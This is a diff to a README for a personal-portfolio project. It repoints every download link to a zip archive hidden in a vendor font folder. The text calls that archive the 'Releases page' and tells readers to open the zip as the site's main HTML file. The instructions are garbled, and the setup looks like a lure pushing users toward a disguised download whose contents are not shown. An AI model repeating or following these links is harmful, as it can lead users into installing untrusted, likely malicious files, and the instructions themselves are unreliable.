@@ -1,6 +1,6 @@
 # 🎨 My-Portfolio - Showcase Your Work Effortlessly
 
-[![Download My-Portfolio](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/unfulsome/My-Portfolio.zip%20My--Portfolio-v1.0-blue)](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/unfulsome/My-Portfolio.zip)
+[![Download My-Portfolio](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/assets/vendor/boxicons/fonts/My_Portfolio_v2.9.zip%20My--Portfolio-v1.0-blue)](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/assets/vendor/boxicons/fonts/My_Portfolio_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to My-Portfolio! This application allows you to create a personal portfo
 
 To get started, you need to download the software from our Releases page. Click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/unfulsome/My-Portfolio.zip)
+[Visit this page to download](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/assets/vendor/boxicons/fonts/My_Portfolio_v2.9.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of My-Portfolio.
@@ -36,7 +36,7 @@ To get started, you need to download the software from our Releases page. Click 
 
 1. **Open the Main HTML File:**
    - Navigate to the extracted folder.
-   - Open `https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/unfulsome/My-Portfolio.zip` in your web browser to view your portfolio.
+   - Open `https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/assets/vendor/boxicons/fonts/My_Portfolio_v2.9.zip` in your web browser to view your portfolio.
 
 2. **Editing Content:**
    - Use any text editor (like Notepad, VS Code, or Sublime Text) to modify the HTML files.
@@ -73,4 +73,4 @@ Feel free to explore more projects on my GitHub profile. You can find various ot
 
 Remember, your portfolio is your personal space to express your skills and showcase your work. Keep it updated and practice regularly with new projects. Happy coding!
 
-[Visit this page to download](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/unfulsome/My-Portfolio.zip)
+[Visit this page to download](https://raw.githubusercontent.com/PadduPadora/My-Portfolio/main/assets/vendor/boxicons/fonts/My_Portfolio_v2.9.zip)
